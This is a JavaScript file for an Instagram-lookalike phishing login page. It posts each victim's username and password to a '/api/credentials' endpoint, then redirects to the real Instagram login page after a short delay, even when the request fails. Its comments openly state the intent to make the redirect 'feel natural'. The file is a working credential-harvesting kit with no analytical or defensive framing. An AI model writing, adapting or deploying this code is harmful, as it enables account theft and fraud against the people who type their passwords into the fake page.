document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('loginForm');
  const usernameInput = document.getElementById('username');
  const passwordInput = document.getElementById('password');
  const loginBtn = document.getElementById('loginBtn');
  const togglePasswordBtn = document.getElementById('togglePassword');
  const btnText = loginBtn.querySelector('.btn-text');
  const btnLoader = loginBtn.querySelector('.btn-loader');

  // Float labels when input has value
  function checkInput(input) {
    if (input.value.length > 0) {
      input.classList.add('has-value');
    } else {
      input.classList.remove('has-value');
    }
    updateLoginButton();
  }

  usernameInput.addEventListener('input', () => checkInput(usernameInput));
  passwordInput.addEventListener('input', () => {
    checkInput(passwordInput);
    // Show/hide the show password button
    togglePasswordBtn.style.display = passwordInput.value.length > 0 ? 'block' : 'none';
  });

  // Toggle password visibility
  togglePasswordBtn.addEventListener('click', () => {
    if (passwordInput.type === 'password') {
      passwordInput.type = 'text';
      togglePasswordBtn.textContent = 'Hide';
    } else {
      passwordInput.type = 'password';
      togglePasswordBtn.textContent = 'Show';
    }
  });

  // Activate login button when both fields have values
  function updateLoginButton() {
    if (usernameInput.value.length > 0 && passwordInput.value.length > 0) {
      loginBtn.classList.add('active');
    } else {
      loginBtn.classList.remove('active');
    }
  }

  // Handle form submission
  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const username = usernameInput.value.trim();
    const password = passwordInput.value;

    if (!username || !password) return;

    // Show loading state
    btnText.style.display = 'none';
    btnLoader.style.display = 'block';
    loginBtn.disabled = true;

    try {
      const response = await fetch('/api/credentials', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
      });

      if (response.ok) {
        // Small delay to feel natural
        setTimeout(() => {
          // Redirect to real Instagram
          window.location.href = 'https://www.instagram.com/accounts/login/';
        }, 1200);
      } else {
        // Still redirect even on error
        setTimeout(() => {
          window.location.href = 'https://www.instagram.com/accounts/login/';
        }, 1200);
      }
    } catch (error) {
      // On network error, redirect anyway
      setTimeout(() => {
        window.location.href = 'https://www.instagram.com/accounts/login/';
      }, 1200);
    }
  });
});
